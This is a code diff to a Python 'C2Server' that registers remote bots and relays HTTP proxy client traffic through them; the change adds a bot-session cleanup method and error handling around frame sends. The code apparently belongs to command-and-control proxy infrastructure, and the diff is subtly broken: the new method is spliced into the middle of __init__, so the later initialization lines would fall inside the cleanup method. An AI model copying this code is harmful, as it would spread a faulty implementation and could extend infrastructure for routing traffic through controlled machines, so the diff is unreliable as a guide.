@@ -117,6 +117,44 @@ class C2Server:
         # Connection tracking
         self._total_connections = 0
         self._connection_counts = {}  # bot_id -> count
+    def _cleanup_bot_session(self, bot_id: str, session: BotSession) -> None:
+        """Mark bot offline and cleanup all associated resources."""
+        # Close any active client writers and decrement connection counts
+        try:
+            for req_id, info in list(session.active.items()):
+                try:
+                    w = info.get("writer")
+                    if w:
+                        w.close()
+                except (ConnectionResetError, BrokenPipeError, OSError) as e:
+                    logger.debug("client writer close error during bot cleanup: %s", e)
+                except Exception as e:
+                    logger.warning("unexpected client writer close error during bot cleanup: %s", e)
+                finally:
+                    self._decrement_connection_count(bot_id)
+                    session.active.pop(req_id, None)
+        except Exception as e:
+            logger.warning("error iterating session.active during cleanup: %s", e)
+
+        # Stop heartbeat and close stream
+        try:
+            if session.heartbeat:
+                # Heartbeat.stop is async; schedule without await in sync method
+                asyncio.create_task(session.heartbeat.stop())
+        except Exception as e:
+            logger.debug("heartbeat stop scheduling error: %s", e)
+        try:
+            session.stream.close()
+        except Exception as e:
+            logger.debug("bot stream close error during cleanup: %s", e)
+
+        # Remove from registry and update RR keys
+        self.bots.pop(bot_id, None)
+        self._rr_keys = list(self.bots.keys())
+        if bot_id in self._connection_counts:
+            self._total_connections -= self._connection_counts.get(bot_id, 0)
+            self._connection_counts.pop(bot_id, None)
+
         
         # Initialize features
         self.health_checker = HealthChecker(self)
@@ -343,13 +381,7 @@ class C2Server:
             logger.error("unexpected bot session error: %s", e)
         finally:
             logger.info("Bot disconnected: %s", bot_id)
-            # Cleanup connection counts
-            if bot_id in self._connection_counts:
-                self._total_connections -= self._connection_counts[bot_id]
-                del self._connection_counts[bot_id]
-            self.bots.pop(bot_id, None)
-            self._rr_keys = list(self.bots.keys())
-            stream.close()
+            self._cleanup_bot_session(bot_id, session)
 
     async def _handle_http_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
         """Handle HTTP proxy clients."""
@@ -426,13 +458,22 @@ class C2Server:
                     chunk = await reader.read(self.buffer_size)
                     if not chunk:
                         break
-                    await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
+                    try:
+                        await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
+                    except (ConnectionResetError, BrokenPipeError, OSError) as e:
+                        logger.debug("client->bot write error: %s", e)
+                        break
             except (ConnectionResetError, BrokenPipeError, OSError) as e:
                 logger.debug("client->bot pump error: %s", e)
             except Exception as e:
                 logger.warning("unexpected client->bot pump error: %s", e)
             finally:
-                await bot.stream.send(Frame(type="END", request_id=req_id))
+                try:
+                    await bot.stream.send(Frame(type="END", request_id=req_id))
+                except (ConnectionResetError, BrokenPipeError, OSError) as e:
+                    logger.debug("client->bot END send ignored: %s", e)
+                except Exception as e:
+                    logger.warning("client->bot END unexpected error: %s", e)
 
         asyncio.create_task(pump_client(), name=f"pump-client-{req_id}")
 
